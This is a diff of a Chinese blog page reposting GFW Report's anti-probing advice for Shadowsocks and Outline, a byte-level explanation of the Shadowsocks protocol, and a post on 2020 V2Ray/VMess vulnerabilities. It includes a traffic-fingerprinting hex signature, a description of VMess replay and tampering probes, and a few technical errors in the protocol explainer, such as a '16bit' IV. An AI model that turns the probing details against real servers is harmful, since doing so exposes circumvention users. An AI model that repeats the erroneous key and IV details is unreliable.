+<p>为了缓解针对Shadowsocks的<a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/sec21summer_len.pdf#page=13">partitioning oracle攻击</a>，你需要:</p>
+<ol>
+<li>使用一个长的随机密码。这样的密码可以用以下命令在终端生成： <code>openssl rand -base64 16</code>;</li>
+<li>禁用UDP模式。</li>
+</ol>
+<p>注意：针对客户端没有特殊的要求，任何与Shadowsocks-libev服务器兼容的客户端均可。</p>
+</blockquote>
+<h3><span id="针对outlinevpn的使用建议">针对OutlineVPN的使用建议</span></h3><blockquote>
+<p>为了防止你的<a target="_blank" rel="noopener" href="https://getoutline.org/">OutlineVPN</a>服务器被GFW封锁，你需要做到以下几点：</p>
+<ol>
+<li>使用最新版的从<a target="_blank" rel="noopener" href="https://getoutline.org/">官网</a>下载的服务端。</li>
+<li>使用最新版的从<a target="_blank" rel="noopener" href="https://getoutline.org/">官网</a>下载的客户端。</li>
+</ol>
+<p>注意：</p>
+<ol>
+<li>Outline会自动生成一个长的，随机的密码，因此你不必像为Shadowsocks-libev那样手动配置密码。</li>
+<li>Outline服务端会自动更新，因此你不必手动升级服务端。</li>
+<li>Outline只采用<code>chacha20-ietf-poly1305</code>这一种AEAD cipher作为加密方式，因此你不必手动选择加密方式。</li>
+</ol>
+</blockquote>
+<h2><span id="给翻墙软件开发者的建议">给翻墙软件开发者的建议</span></h2><blockquote>
+<p>下面我们介绍我们发现的GFW的最新审查能力，并附上我们给翻墙软件开发者的相应建议。这些建议不仅对Shadowsocks，而且对其他许多翻墙软件都有用。 我们欢迎你加入我们的讨论，分享你的想法，评论，疑惑和关切。</p>
+</blockquote>
+<h3><span id="正确的校验">正确的校验</span></h3><blockquote>
+<p>首先，我们强烈建议翻墙软件的开发者们<strong>彻底</strong>废除不具备校验的加密构造。仅仅有保密性是不够的。</p>
+<ul>
+<li>对于新开发的翻墙软件来说，这意味着根本不应考虑支持不具备校验的加密构造。</li>
+<li>对于现存的翻墙软件来说，这意味着开发者应该勇敢地<strong>移除</strong>所有与不具备教研的加密构造相关的代码，即使以不向下兼容为代价。</li>
+</ul>
+<p>我们这看似大胆的建议实际上出于合理的原因。如我们在<a target="_blank" rel="noopener" href="https://gfw.report/publications/imc20/data/paper/shadowsocks.pdf#page=7">论文</a>中所介绍的， 一些类型的GFW主动探测会利用Shadowsocks的stream ciphers的malleability。这已经不是第一次不具备校验的加密结构造成漏洞了。事实上，不具备校验的加密结构是许多Shadowsocks和其他翻墙软漏洞的根本来源。</p>
+<p>早在2015年8月，BreakWa11<a target="_blank" rel="noopener" href="https://web.archive.org/web/20160829052958/https://github.com/breakwa11/shadowsocks-rss/issues/38">发现了</a>一个关于Shadowsocks的stream ciphers的漏洞。这个漏洞是由于缺乏数据完整性保护而造成的（<a target="_blank" rel="noopener" href="https://groups.google.com/d/msg/traffic-obf/CWO0peBJLGc/Py-clLSTBwAJ">英文总结</a>）。 在2020年，类似的漏洞又被<a target="_blank" rel="noopener" href="https://github.com/v2ray/v2ray-core/issues/2523">发现</a>存在于V2Ray中（<a target="_blank" rel="noopener" href="https://gfw.report/blog/v2ray_weaknesses/zh/">总结</a>）。</p>
+<p>当Shadowsocks开发者试图引入<code>one time auth</code>模式来缓解2015年的那个漏洞时，另一个因数据长度缺乏完整性保护的主动探测又被<a target="_blank" rel="noopener" href="https://web.archive.org/web/20191002190325/https://printempw.github.io/why-do-shadowsocks-deprecate-ota/">引入了</a>（<a target="_blank" rel="noopener" href="https://groups.google.com/d/msg/traffic-obf/CWO0peBJLGc/Py-clLSTBwAJ">英文总计</a>）。</p>
+<p>2020年2月，Zhejiang Peng<a target="_blank" rel="noopener" href="https://github.com/edwardz246003/shadowsocks">发现了</a>一个关于Shadowsocks stream ciphers的灾难性的漏洞，(<a target="_blank" rel="noopener" href="https://github.com/net4people/bbs/issues/24">英文总结</a>）。 利用使用了stream cipher的Shadowsocks服务器作为decryption oracle，攻击者可以在不需要密码的情况下，完全解密Shadowsocks会话。</p>
+<p>其实早在2017年2月，AEAD ciphers就已经成为了Shadowsocks协议的一部分。而校验问题也理应在那时就被解决了。但实际情况是，截止2021年，大量的服务器仍然因为使用被废弃的stream ciphers而存在着安全隐私漏洞，以及被准确识别的风险。</p>
+<p>这样的现象表明，在实际操作中，许多的用户不能够正确的选择加密方式。这可能与使用过时的教程或一键脚本有关。 我们因此鼓励开发者从Shadowsocks各实现中彻底移除stream ciphers，帮助用户做出正确的选择。</p>
+</blockquote>
+<h3><span id="使用同时基于nonces和时间的重放过滤器">使用同时基于nonces和时间的重放过滤器</span></h3><blockquote>
+<p>我们建议翻墙软件的开发者们采用同时基于nonces和时间的重放过滤器。 因为采用基于时间的重放过滤器需要对Shadowsocks协议进行根本性地变动，我们建议开发者至少要此采用基于nonces的过滤器，并且做到：</p>
+<ol>
+<li>要么建议用户在每次过滤器重置后修改密码；</li>
+<li>要么开发一个机制，可以让重放过滤器在软件重启后依然记得之前的nonces。</li>
+</ol>
+<p>这些建议是基于以下的研究发现和推论。 如<a target="_blank" rel="noopener" href="https://gfw.report/publications/imc20/data/paper/shadowsocks.pdf#page=5">论文的section 3.5</a>所介绍的， GFW既可以在观察到一个合法连接的瞬间对其进行重放；也可以等待三周甚至更长时间后才重放。 因此，一个更加合理的主动探测模型应该允许审查者在任意时长后对合法连接进行重放。</p>
+<p>这样的一个主动探测模型揭示了纯粹基于nonces的重放过滤所须要面对的不对称性。GFW仅用少量资源就可以记录<strong>一些</strong>合法的连接，并且在经过任意的时长后再重放它们；但与此同时，Shadowsocks需要大量的资源和相对复杂的实现来永久性地记住<strong>所有的</strong>合法链接，直至密码被更换。 注意，Shadowsocks服务器必须在重启后还记住这些nonces；否则重放过滤器不会过滤基于重启前的合法连接的重放。</p>
+<p>幸运的是，这个不公平的局面可以通过同时引入基于时间的重放过滤机制来扭转：服务器只需要处理并验证时间戳未过期的连接，<a target="_blank" rel="noopener" href="https://gfw.report/blog/v2ray_weaknesses/en/">就像VMess服务器那样</a>。 如此一来服务器就不需要永久性地记住所有合法连接中的nonces。</p>
+<p>我们还想强调，对于那些仅仅短暂暴露变化的监听端口的翻墙服务器，重放过滤仍是必要的。因为GFW可以瞬时重放合法连接中的第一个数据包，而这时暴露的监听端口因为未完成数据传输，依然是开启的。</p>
+</blockquote>
+<h3><span id="让服务器的反应保持一致">让服务器的反应保持一致</span></h3><blockquote>
+<p>我们建议开发者们确保翻墙服务器在正常运行时，和遇到不合法的连接时都反应一致。理想情况下，可以按照<a target="_blank" rel="noopener" href="https://censorbib.nymity.ch/pdf/Frolov2020a.pdf#page=12">Frolov et al.</a>的建议，让服务器遇到错误连接时“read forever”。 这是因为，审查者会故意触发协议的边边角角等特殊情况，来识别服务器指纹。</p>
+<p>除了我们在Shadowsocks-libev和OutlineVPN中发现的服务器反应指纹，<a target="_blank" rel="noopener" href="https://censorbib.nymity.ch/pdf/Frolov2020a.pdf#page=11">Frolov et al.</a>还展示了包括Shadowsocks-python和OutlineVPN在内的多种翻墙软件可以通过关闭连接时的TCP flags和连接时长来识别。studentmain<a target="_blank" rel="noopener" href="https://github.com/net4people/bbs/issues/22#issuecomment-744704701">报告</a>，直至2020年12月， 许多的Shadowsocks实现仍存在着我们在Shadowsocks-libev和Outline中发现的问题。</p>
+<p>Frolov et al.建议代理服务器在遇到错误连接时不要立即关闭连接，而是“read forever”。这样做不但避免泄漏超时值，而且使得服务器发送与正常连接关闭时相同的TCP flags来关闭错误连接。</p>
+<p>进一步说，“reading forever”本身不会带来更加独特的指纹。因为Frolov et al.发现<a target="_blank" rel="noopener" href="https://censorbib.nymity.ch/pdf/Frolov2020a.pdf#page=12">互联网上大量的服务器都会有无限超时值（“infinite timeout”）的特征</a>。David Fifield<a target="_blank" rel="noopener" href="https://github.com/net4people/bbs/issues/26#issuecomment-599712288">调查</a>显示，许多流行的翻墙软件已经采取了“read forever”策略。这些软件包括OSSH，obfs4，Outline和Lampshade。</p>
+</blockquote>
+<h3><span id="强制采用强密码">强制采用强密码</span></h3><blockquote>
+<p>Len et al. 于2020年展示了针对Shadowsocks服务器的<a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/sec21summer_len.pdf#page=13">partitioning oracle攻击</a>。利用在Shadowsocks中使用的non-committing AEAD，攻击者可以更高效地猜出密码。我们因此建议开发者强制采用强密码。一种可能的实现方式是要求用户密码的熵高于一定值。</p>
+</blockquote>
+<h3><span id="主动探测你的实现">主动探测你的实现</span></h3><blockquote>
+<p>如果你是一个不同于Shadowsocks-libev和Outline的翻墙软件开发者或贡献者，我们鼓励你检查同样的漏洞是否也存在于你的Shadowsocks实现中。我们开源了我们在<a target="_blank" rel="noopener" href="https://gfw.report/publications/imc20/data/paper/shadowsocks.pdf#page=8">论文Section 5.1</a>中用到的<a target="_blank" rel="noopener" href="https://gfw.report/publications/imc20/data/code/prober_simulator/">prober 模拟器</a>。</p>
+</blockquote>
+<h2><span id="鸣谢">鸣谢</span></h2><blockquote>
+<p>我们想要感谢来自Jigsaw的Vinicius Fortuna，来自APNIC的Robert Mitchell和Dan Fidler，以及来自Qv2ray的DuckSoft和Student Main对本文提供的反馈。</p>
+</blockquote>
+<h2><span id="联系">联系</span></h2><blockquote>
+<p>这篇报告首发于<a target="_blank" rel="noopener" href="https://gfw.report/blog/ss_advise/zh/">GFW Report</a>。我们还在APNIC blog，<a target="_blank" rel="noopener" href="https://github.com/net4people/bbs/issues/58">net4people</a>以及<a target="_blank" rel="noopener" href="https://ntc.party/t/a-practical-guide-to-defend-against-the-gfws-latest-active-probing/847">ntc.party</a>同步更新了博文。</p>
+<p>我们鼓励您或公开地或私下地分享您的评论或疑问。我们私下的联系方式可见<a target="_blank" rel="noopener" href="https://gfw.report/">GFW Report</a>的页脚。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Proxy/" rel="tag">Proxy</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Shadowsocks/" rel="tag">Shadowsocks</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/29/Shadowsocks-UDP/">
+                Shadowsocks协议解析
+            </a>
+        </h2>
+    
+    <time>
+        Jan 29, 2024
+    </time>
+    <section class="content">
+        <h1><span id="shadowsocks协议解析">Shadowsocks协议解析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.ichenxiaoyu.com/ss/">喂草</a> 并作补充</p>
+</blockquote>
+<h2><span id="shadowsocks过程">Shadowsocks过程</span></h2><blockquote>
+<p>Shadowsocks是一个代理协议，以下简称SS。当然基于SS协议催生出了许多的代理软件，例如Shadowsocks-NG（MacOS平台）、Shadowrocket（iOS平台）等。不过总归来说SS的流程是一致的：</p>
+<p><img src="/2024/01/29/Shadowsocks-UDP/1.png" alt="image"></p>
+<p>上图简述了SS在整个数据传输中的位置，包含了SS客户端和SS服务端两个部分，一般来说SS客户端是安装在本地的软件，而SS服务端则是运行在VPS上的软件。如果没有SS的话，上图就成了没有代理的用户与目标服务器（例如Google.com）的直接通信。下面一SS代理下的HTTP请求介绍上述过程：</p>
+<ol>
+<li>浏览器要访问Google.com，便生成HTTP请求。由于设置了代理，所以不会直接发送到Google服务器，而是发送到SS客户端（例如127.0.0.1:1086）。</li>
+<li>SS客户端把HTTP请求封装成<strong>SS请求</strong>（后面详细介绍），包含协议封装和加密过程，发送给SS服务器。</li>
+<li>SS服务器收到SS请求并解析，包含解密和协议解析过程，获得原始HTTP请求。</li>
+<li>SS服务器连接Google服务器，发送用户的原始HTTP请求，并获取Google返回的HTTP响应。</li>
+<li>SS服务器对HTTP请求进行加密，并发送到SS客户端。此处没有协议封装。</li>
+<li>SS客户端收到SS服务器的响应，进行数据解密得到HTTP响应，发送到浏览器以完成HTTP请求。</li>
+</ol>
+</blockquote>
+<h2><span id="shadowsocks协议">Shadowsocks协议</span></h2><blockquote>
+<p>接下来会在<strong>字节层面</strong>对上述过程进行详细介绍。由于SS在处理TCP连接和UDP报文所使用的协议有所差异，因此也会分开介绍。</p>
+</blockquote>
+<h3><span id="tcp连接">TCP连接</span></h3><blockquote>
+<p>TCP连接模式主要包括HTTP、HTTPS和Socket等应用层协议，这些协议有所差异比如说有的协议有握手，有的协议却只有一来一回的数据交互，有的协议可能会保持长时间的连接和数据传输。。但这些对于SS来说都是一样的，因为它们都不过是<strong>数据</strong>（payload），而SS要做的无非是<strong>创建两个通道，一个用于把客户端数据传输到服务端，一个用于把服务端的数据传输到客户端</strong>。</p>
+</blockquote>
+<h4><span id="ss请求">SS请求</span></h4><blockquote>
+<p>TCP握手很熟悉了，握手的目的是建立数据链路。SS也有握手过程，目的就是建立上述的数据链路，不过这个过程只有<strong>半次握手</strong>，即SS请求。SS请求的主要功能是建立代理链路，因此需要告诉SS服务器要代理访问的远程服务器地址（如果不知道IP地址的话，给域名也可以），然后可以顺便携带一部分传输数据。根据地址类型的不同，SS请求会有3种形式：</p>
+<ol>
+<li>通过SS请求传输目标服务器的IPv4地址：</li>
+</ol>
+<p><img src="/2024/01/29/Shadowsocks-UDP/2.png" alt="image"></p>
+<ol start="2">
+<li>通过SS请求传输目标服务器的IPv6地址：</li>
+</ol>
+<p><img src="/2024/01/29/Shadowsocks-UDP/3.png" alt="image"></p>
+<ol start="3">
+<li>在不知道目标服务器IP地址的时候（比如DNS被劫持），直接传输目标服务器的域名：</li>
+</ol>
+<p><img src="/2024/01/29/Shadowsocks-UDP/4.png" alt="image"></p>
+</blockquote>
+<h4><span id="客户端加密">客户端加密</span></h4><blockquote>
+<p>SS客户端把SS请求组装好了，在向SS服务器传输之前还需要进行加密，否则用户的数据就在网络上明文传输了，这个是很不安全的。下面举例使用SS中最常用的加密方案AES-256-cfb方式进行数据加密，大致步骤如下：</p>
+<ol>
+<li><strong>密钥生成</strong>：AES-256意味着其密钥长度是256bit，但用户密码有长有短，而且都是可见的ASCII，把密码作为密钥来用显然安全性是不够的，所以需要<strong>根据密码生成安全性达标的256bit长度密钥</strong>。SS中使用MD5对密码生成16byte长度的消息摘要，即可作为密钥使用。</li>
+<li><strong>IV生成</strong>：原始AES加密下，对于相同的明文会生成相同的密文，这也是安全性的一种缺陷。AES-cfb通过引入随机数IV的方式解决该问题，即在随机数IV的加持之下可以实现相同的明文生成不同的密文。在AES-256-cfb中，IV是一个16bit的随机数。</li>
+<li><strong>加密</strong>：有了密钥、加密算法、IV，就可以生成加密器，并对数据进行加密了。在此数据就是上述所组装的SS请求，得到密文cypher。为了让SS服务端可以解密，还需要把IV也一同发送，所以最终生成的数据如下：</li>
+</ol>
+<p><img src="/2024/01/29/Shadowsocks-UDP/5.png" alt="image"></p>
+</blockquote>
+<h4><span id="服务端解析">服务端解析</span></h4><blockquote>
+<p>SS服务器和SS客户端所共享的信息有密码和加密方式，这是配置过SS服务器的人都知道的，在收到SS客户端发送的SS请求后，SS客户端进行解析的过程如下：</p>
+<ol>
+<li><strong>密钥生成</strong>：根据密码生成密钥，由于和客户端拥有相同的密码和密钥生成算法，所以生成的AES-256-cfb密钥也是一样的。</li>
+<li><strong>获取IV</strong>：从SS客户端接收到的数据前16bit提取出来就得到了AES-256-cfb的IV。</li>
+<li><strong>解密</strong>：根据密钥、加密算法和IV生成解密器，对收到的数据进行解密，就得到了SS请求明文。</li>
+<li><strong>地址解析</strong>：根据SS请求的第1个Byte得知目标服务器地址的类型（IPv4，IPv6或域名），并根据相应的规则进行解析得到其地址与端口。</li>
+<li><strong>代理请求</strong>：说到底SS就是一个代理协议，代理的意思就是<strong>代替客户端对目标服务器发起请求</strong>。通过地址与端口连接目标服务器，并发送解密后的数据，完成请求。</li>
+</ol>
+</blockquote>
+<h4><span id="服务端响应">服务端响应</span></h4><blockquote>
+<p>SS服务器收到目标服务器的数据，把数据传输给SS客户端，也需要进行加密，不同的是<strong>不需要组装协议了</strong>。所以该过程就比较简单：</p>
+<ol>
+<li><strong>生成IV</strong>：虽然也是随机数，但该IV与SS客户端发送请求时生成的IV不相等，需要再生成一个。</li>
+<li><strong>加密</strong>：根据新生成的IV、密钥和加密算法生成加密器，对目标服务器响应的数据进行加密。同样为了SS客户端可以解密，也需要把IV连同密文一起发送给客户端。</li>
+</ol>
+</blockquote>
+<h4><span id="客户端解析">客户端解析</span></h4><blockquote>
+<p>SS客户端收到服务端的数据，通过提取IV就可以生成响应的解密器，对数据进行解密，从而完成用户与目标服务器的通信。<br>上述的加密器和解密器都是和连接绑定的，即一次TCP连接代理通信只需要互相发送一次IV用于双方创建解密器，而后续的通信内容都只有包括密文部分，使用解密器进行解密即可。<br>所以其实SS协议的过程是非常简单的，以至于在画下图的时候都不知道有什么可以加上的东西。</p>
+<p><img src="/2024/01/29/Shadowsocks-UDP/6.png" alt="image"></p>
+</blockquote>
+<h3><span id="udp连接">UDP连接</span></h3><blockquote>
+<p>UDP模式在SS中通过<strong>UDP转发</strong>选项开启，用于代理UDP流量如DNS查询、即时语音通信等。</p>
+</blockquote>
+<h4><span id="udp模式和tcp模式差异">UDP模式和TCP模式差异</span></h4><blockquote>
+<p>SS中TCP和UDP大同小异，但由于UDP之于TCP是<strong>无连接协议</strong>，因此简单探讨一下UDP模式无连接下的一些区别：</p>
+<ol>
+<li><strong>TCP连接作为基本单位</strong>：在TCP模式中，从握手到挥手的过程就是一次连接，因此一次连接是SS中的基本单位，所以一次连接对应上下行的2个加密通道、2个IV。所以一次TCP连接中无论有多少次数据交互，<strong>只需要一次握手</strong>。</li>
+<li><strong>UDP数据分组作为基本单位</strong>：在UDP模式中没有连接的概念，其基本单位是每个数据包，所以<strong>每个数据包对应1个IV和加密解密器</strong>。可以说在UDP模式下有多少个数据包，就会发生多少次SS握手。</li>
+<li><strong>连接方式差异</strong>：因为UDP是无连接，所以在socket编程时通常不会像UDP连接一样，先connect然后才数据读写，而是直接进行数据包的收发。</li>
+<li><strong>方向性</strong>：TCP模式种中总是SS客户端向SS服务器发起握手，但在UDP模式中由于没有连接的概念，所以每个数据包都是平等的自带握手信息，即使SS服务器向SS客户端发送的数据也是。</li>
+</ol>
+</blockquote>
+<h4><span id="udp下的握手协议">UDP下的握手协议</span></h4><blockquote>
+<p>UDP模式中<strong>每一个数据包都具有相同格式</strong>，无论是从SS客户端发往SS服务器，还是从SS服务器发往SS客户端，其格式与上述<strong>SS请求</strong>相同：</p>
+<p><img src="/2024/01/29/Shadowsocks-UDP/7.png" alt="image"></p>
+<p>所以不仅SS客户端会把需要代理访问的目标服务器的地址信息告诉SS服务器，SS服务器也会把目标服务器返回的数据连同其地址信息一同返回SS客户端。这主要是因为UDP模式下是没有连接的概念，所以每条数据需要自带一些额外信息，就像每次进商场都要戴口罩测体温一样。</p>
+</blockquote>
+<h2><span id="后记">后记</span></h2><blockquote>
+<p> 学术交流而已。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Proxy/" rel="tag">Proxy</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Shadowsocks/" rel="tag">Shadowsocks</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/29/V2ray-Vulnerability/">
+                V2ray协议爆发了重大安全漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Jan 29, 2024
+    </time>
+    <section class="content">
+        <h1><span id="v2ray协议爆发了重大安全漏洞">V2ray协议爆发了重大安全漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://dolorhunter.com/v2ray-protocol-security-vulnerability/">DolorHunter</a> 并作补充</p>
+</blockquote>
+<p><strong>服务器端的 V2ray 更新到 v4.23.4 以及之后的版本可以解决这一问题, 请大家尽快更新.</strong></p>
+<blockquote>
+<p>这可能是 V2ray 自 15 年发布 v1.0.0 以来面临的最大危机.</p>
+<p>六一前后, 有大量网友反应自己的裸 V2ray 配置(Vmess+TCP 的默认配置)失效了, 我本来也没太当回事, 毕竟过几天就是 535 了, 断一断网是老传统, 并没有什么好说的. 不过有一点与以往不同, 这次被阻断的用户都是使用默认配置.</p>
+<p>V2ray 的默认配置是 Vmess+TCP. 虽然中庸普通, 但它并不是一个容易被阻断的配置. 之前被阻断的 V2ray 配置通常都是些 KCP&#x2F;mKCP 或是 QUIC 这类的基于 UDP 协议的配置. UDP 通信数据特征明显, 因此容易被 GFW 逮个正着. 而 TCP 是可靠协议, 而且目前大量的网络数据也是基于 TCP 协议, 因此 TCP 协议一直都还算安全.</p>
+<p>我的认知里Vmess协议有个安全性排名: Vmess+TCP&#x2F;WS&#x2F;HTTP2+TLS &gt; Vmess+TCP&#x2F;WS&#x2F;HTTP2 &gt; Vmess+KCP&#x2F;mKCP&#x2F;QUIC. 如果用白话来解释就是带TLS的配置是最高一档90分优秀, 中间配置60分及格凑合, 最后一档是不及格. 我一直认为, 只要不用 KCP&#x2F;mKCP&#x2F;QUIC 爆炸三兄弟, 还是能舒心上网的. 然而我的预判出了大错误.</p>
+</blockquote>
+<h2><span id="发现重大安全漏洞">发现重大安全漏洞</span></h2><blockquote>
+<p>QV2ray-dev 社区首先发声. 六一当天, QV2ray-dev 警告用户不要使用 Vmess+TCP, 部分 Vmess+WS 及部分 Vmess+ws+TLS(insecure) 的配置组合. 他解释到 GFW 正在进行主动探测, 在 30s 内就可以接近 100% 的探测出你是否使用 Vmess+TCP 的配置, 其他配置亦可以受到波及. 并且此问题并无解决方案, 解决该问题可能需要重新设计 Vmess 协议.</p>
+<p>看到了这条消息后, 当下到 V2ray 社区逛了一圈, 发现事态比想象中的严重许多. p4gefau1t 发了一个名为 <a target="_blank" rel="noopener" href="https://github.com/v2ray/discussion/issues/704">v2ray的TLS流量可被简单特征码匹配精准识别（附PoC)</a> 的帖子. 过后十几小时又发了个名为 <a target="_blank" rel="noopener" href="https://github.com/v2ray/v2ray-core/issues/2523">vmess协议设计和实现缺陷可导致服务器遭到主动探测特征识别(附PoC)</a> 的帖子. 这两个帖子在短短几小时内已经获得了数十个回复, 并且多为负责此项目的大牛.</p>
+<p>p4gefau1t 首先发现仅凭tls client hello的cipher suite字段，就可以非常准确地将v2ray流量和正常浏览器流量区分开来。</p>
+<p>他通过 <a target="_blank" rel="noopener" href="https://fr33land.net/2020/03/12/can-enable-tls-in-v2ray-help/">这篇文章</a> 中提到了使用机器学习训练的模型可对v2ray的tls+ws流量进行识别，准确率高达0.9999. 后来, 经过本地测试，可以复现。并且不限于tls+ws，对tls+vmess等组合也同样有效。其他tls流量如浏览器流量等，全程没有出现误报情况。因此初步怀疑是v2ray使用的utls进行client hello伪造出现的问题。</p>
+<p>通过抓包对比真实的chrome与utls的client hello，发现两者基本一致，但与v2ray的存在较大差别，其中包括suite和extension的差别。此后，我们将utls的chrome的cipher suite patch到v2ray中后，此模型无法识别v2ray的tls流量。所以我们可以初步认为，模型很可能是学习了tls client hello的特征，导致流量被识别。</p>
+<p>他发现识别tls client hello并不需要使用机器学习的方法，简单的DPI即可实现，因此在gfw部署的成本很低。并且，由于这组cipher suites太过特殊，我们可以仅凭cipher suites进行准确识别。</p>
+<p>Cipher Suite 的特征有多特殊呢? 帖子下的网友随手撸一个从 0x90 偏移量开始的 memcmp 都能精准高效识别“特征码”：<code>cca8cca9c02fc02bc030c02cc027c013c023c009c014c00a130113031302</code> 甚至可以利用 iptables 进行明文匹配…… 帖内多个网友用其他配置也多次复现成功, 都得到了相同的特征码.</p>
+<p>这个漏洞可以说是十分棘手. 几乎可以说只要 GFW 想, 随时可以全国断网, 并且不分配置(不管有没有 TLS 都是死路一条).</p>
+<p>p4gefau1t 在十几个小时后又发了一个帖子. 这次他构造出了更具杀伤性的PoC, 仅需16次探测即可准确判定vmess服务，误报可能性几乎为0，校验的缓解措施均无效。唯一的解决方案是禁用vmess或者重新设计协议。</p>
+<table>
+<thead>
+<tr>
+<th>16 字节</th>
+<th>X 字节</th>
+<th>余下部分</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>认证信息</td>
+<td>指令部分</td>
+<td>数据部分</td>
+</tr>
+</tbody></table>
+<p>Vmess 协议前16字节为认证信息，内容为和时间、用户ID相关的散列值。根据协议设计，每个16字节的认证信息auth的有效期只有30秒。而问题出在指令部分。指令部分使用了没有认证能力的aes-cfb方式，因此攻击者可以篡改其中内容，而仍然能被服务器接受。</p>
+<table>
+<thead>
+<tr>
+<th>1 字节</th>
+<th>16 字节</th>
+<th>16 字节</th>
+<th>1 字节</th>
+<th>1 字节</th>
+<th>4 位</th>
+<th>4 位</th>
+<th>1 字节</th>
+<th>1 字节</th>
+<th>2 字节</th>
+<th>1 字节</th>
+<th>N 字节</th>
+<th>P 字节</th>
+<th>4 字节</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>版本号 Ver</td>
+<td>数据加密 IV</td>
+<td>数据加密 Key</td>
+<td>响应认证 V</td>
+<td>选项 Opt</td>
+<td>余量 P</td>
+<td>加密方式 Sec</td>
+<td>保留</td>
+<td>指令 Cmd</td>
+<td>端口 Port</td>
+<td>地址类型 T</td>
+<td>地址 A</td>
+<td>随机值</td>
+<td>校验 F</td>
+</tr>
+</tbody></table>
+<p>前16字节的认证信息可以被重复使用，并且只要通过认证，执行流即可进行到140行，初始化aes密钥流。接着在144行处，服务端在没有经过任何认证的情况下，读入38字节的密文，并使用aes-cfb进行解密，在没有进行任何校验的情况下，将其中版本号，余量P，加密方式等信息，直接填入结构体中。</p>
+<p>这里问题已经很明显了，攻击者只需要得知16字节的认证信息，就可以在30秒内反复修改这38字节的信息进行反复的重放攻击&#x2F;密文填充攻击。</p>
+<p>aes本身可以抵抗已知明文攻击，因此安全性方面基本没有问题。出现问题的是余量P。我猜想设计者应该是为了避免包的长度特征而引入这个字段，但是读入余量的方式出现了问题：在没有校验余量P、加密方式Sec、版本号Ver、指令 Cmd、地址类型T、地址A的情况下，将P直接代入ReadFullFrom中读取P字节（182行）。注意，这里P的范围是2^4&#x3D;16字节以内。读取P+4字节后，v2ray才会对前面读入的内容进行校验，判断命令部分是否合法。如果不合法，断开连接。</p>
+</blockquote>
+<h2><span id="临时性纾困方案">临时性纾困方案</span></h2><blockquote>
+<p>V2ray 社区针对这一漏洞在一周内接连推出了两个小的版本更新, 4.23.3 和 4.23.4.</p>
+<ul>
+<li>v4.23.3 修复了 <a target="_blank" rel="noopener" href="https://github.com/v2ray/v2ray-core/issues/2523">vmess协议设计和实现缺陷可导致服务器遭到主动探测特征识别(附PoC)</a> 中的严重漏洞.</li>
+<li>v4.23.4 进一步的修复了 Vmess 和 伪HTTP头的漏洞.</li>
+</ul>
+<p>V2Ray 项目在最近的几天内收到了数个隐匿性能方面的漏洞报告。这些漏洞都在被提出的数个小时内被解决（除 mKCP 修复暂缓）并发布相关更新。您可以升级到最新版本 v4.23.4 来获取最大程度的保护。我们支持和鼓励寻找并提出 V2Ray 各个方面漏洞的人。我们希望 V2Ray 的用户不要指责或者攻击为我们提供安全审计的人士。</p>
+</blockquote>
+<h3><span id="可以使用">可以使用</span></h3><blockquote>
+<p>如果你已经升级到 V2Ray v4.23.4，并且没有开启 TLS 的 AllowInsecure 选项，以下配置组合不会泄露识别信息：</p>
+<p>VMess over Websocket with TLS</p>
+<p>VMess over TLS</p>
+<p>VMess over HTTP&#x2F;2 （使用 TLS 的 HTTP&#x2F;2，并非 h2c）</p>
+<p>Shadowsocks(AEAD) over Websocket with TLS</p>
+</blockquote>
+<h3><span id="谨慎使用">谨慎使用</span></h3><blockquote>
+<p>以下配置组合可能会在攻击者位于网络路径上时可能会使攻击者获得的协议数据的一些统计学属性，但是这些信息不足以用于确定服务器上部署了这些协议</p>
+<p><del>VMess over TCP （还在继续改进中）</del> 已修复, 可以正常使用</p>
+</blockquote>
+<h3><span id="并不建议">并不建议</span></h3><blockquote>
+<p>以下配置组合不建议用于穿越被攻击者控制的网络：</p>
+<p>任何协议 + SOCKS5</p>
+<p>任何协议 + HTTP 代理</p>
+<p>任何协议 + HTTP 伪装</p>
+<p>任何协议 + mKCP + 任何伪装</p>
+<p>-xiaokangwang 于 <a target="_blank" rel="noopener" href="https://github.com/v2ray/v2ray-core/issues/2542">关于在近期收到的数个漏洞的项目组公告</a></p>
+</blockquote>
+<h2><span id="协议的长期解决方案">协议的长期解决方案</span></h2><blockquote>
+<p>重写 Vmess 协议可能是在较长时间内解决这一问题的唯一出路.</p>
+<p>Vmess 协议已经诞生了很长一段时间. 那时候互联网上tls并不普及，tls1.3也还没出来。因此协议过时出现问题可以说是必然. 依照此趋势, 我倾向于认为下一代的 Vmess 默认协议可能会是类似 Vmess+TCP&#x2F;WS&#x2F;HTTP2+TLS 的设计. HTTP3 短期看来不太可能有具体应用, 毕竟 QUIC 作为 HTTP3的雏形, 翻车翻成什么样大家心里都有数.</p>
+<p>这次可能可以说是 V2ray 面世五年来遇到的最大一次危机. 不过, 目前的两个紧急补丁已经缓解了燃眉之急, 并且就 V2ray 社区的效率(两天内连续两个补丁), 我基本上已经消解了我之前的随时可能断网的担忧了.</p>
+<p>当前社区内对于新协议的讨论如火如荼, 每天都能看到新的点子冒出来. 过不了多久可能就会见到新的用于替换当前的 Vmess 的协议, 或者是目睹 V2ray 终于要进入 v5.0.0时代. 不论是目睹了其中的任何一件, 都是在见证历史, 见证开源社区的协作, 见证又一次与 GFW 的缠斗.</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
